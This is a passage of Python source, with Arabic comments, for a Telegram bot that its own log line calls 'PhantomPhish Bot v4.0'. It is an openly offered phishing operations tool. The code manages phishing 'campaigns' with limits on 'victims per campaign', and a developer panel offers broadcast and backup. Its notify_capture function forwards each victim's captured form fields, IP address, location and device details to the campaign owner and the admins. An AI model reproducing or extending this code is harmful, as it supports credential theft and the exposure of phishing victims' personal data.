        caption=f"🗄️ نسخة احتياطية - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )

@dp.callback_query_handler(lambda c: c.data == "broadcast_all")
async def process_broadcast_all(callback: CallbackQuery, state: FSMContext):
    """بث للجميع"""
    if callback.from_user.id != config.DEVELOPER_ID:
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    await BroadcastState.waiting_for_message.set()
    await callback.message.edit_text(
        "📢 **بث جماعي للمطور**\n\n"
        "أرسل الرسالة:",
        parse_mode="Markdown"
    )

@dp.callback_query_handler(lambda c: c.data == "bot_settings")
async def process_bot_settings(callback: CallbackQuery):
    """إعدادات البوت"""
    if callback.from_user.id != config.DEVELOPER_ID:
        await callback.answer("غير مصرح", show_alert=True)
        return
    
    settings_text = f"""
⚙️ **إعدادات البوت**

🔑 التوكن: `{'*' * 20}...`
👥 المشرفون: {len(config.ADMIN_IDS)}
🌐 الرابط العام: {config.PUBLIC_URL}
🗄️ قاعدة البيانات: SQLite
🔧 المطور: {config.DEVELOPER_ID}

📊 **الحدود:**
• الحملات/مستخدم: {config.MAX_CAMPAIGNS_PER_USER}
• ضحايا/حملة: {config.MAX_VICTIMS_PER_CAMPAIGN}
    """
    
    await callback.message.edit_text(
        settings_text,
        parse_mode="Markdown",
        reply_markup=dev_panel_keyboard()
    )

# === دوال مساعدة ===

async def notify_admins_new_campaign(user_id: int, campaign: Dict):
    """إشعار المشرفين بحملة جديدة"""
    user = db.get_user(user_id)
    
    message = f"""
🆕 **حملة جديدة تم إنشاؤها**

👤 المستخدم: {user['first_name'] if user else 'Unknown'}
🆔 ID: `{user_id}`
📝 اسم الحملة: {campaign['name']}
🎯 المنصة: {campaign['platform']}
🆔 معرف الحملة: `{campaign['campaign_id']}`

⏰ {datetime.now().strftime('%H:%M:%S')}
    """
    
    for admin_id in config.ADMIN_IDS:
        try:
            await bot.send_message(admin_id, message, parse_mode="Markdown")
        except:
            pass

async def notify_capture(campaign_id: str, victim_id: int, data: Dict):
    """إشعار بالتقاط بيانات جديدة"""
    campaign = db.get_campaign(campaign_id)
    victim = db.get_victim(victim_id)
    
    if not campaign or not victim:
        return
    
    # بناء رسالة الإشعار
    message = f"""
🚨 **تنبيه: بيانات جديدة!**

🎯 الحملة: {campaign['name']}
👤 الضحية #{victim_id}
🌐 IP: {victim['ip_address']}
📍 الموقع: {victim['country']}, {victim['city']}
📱 الجهاز: {victim['device_type']} - {victim['os']}

📥 **البيانات الملتقطة:**
"""
    
    for field, value in data.items():
        if field not in ['session_id', 'user_agent', 'type']:
            message += f"\n• {field}: `{value}`"
    
    message += f"\n\n⏰ {datetime.now().strftime('%H:%M:%S')}"
    
    # إرسال لصاحب الحملة
    try:
        await bot.send_message(
            campaign['created_by'],
            message,
            parse_mode="Markdown"
        )
    except:
        pass
    
    # إرسال للمشرفين أيضاً
    for admin_id in config.ADMIN_IDS:
        if admin_id != campaign['created_by']:
            try:
                await bot.send_message(admin_id, message, parse_mode="Markdown")
            except:
                pass

# === معالجة الأخطاء ===

@dp.errors_handler()
async def error_handler(update, exception):
    """معالج الأخطاء العام"""
    logger.error(f"Error: {exception}")
    return True

# === التشغيل ===

if __name__ == '__main__':
    logger.info("🤖 PhantomPhish Bot v4.0 Started")
    logger.info(f"👨‍💻 Developer ID: {config.DEVELOPER_ID}")
    logger.info(f"👑 Admin IDs: {config.ADMIN_IDS}")
    
    executor.start_polling(dp, skip_updates=True)
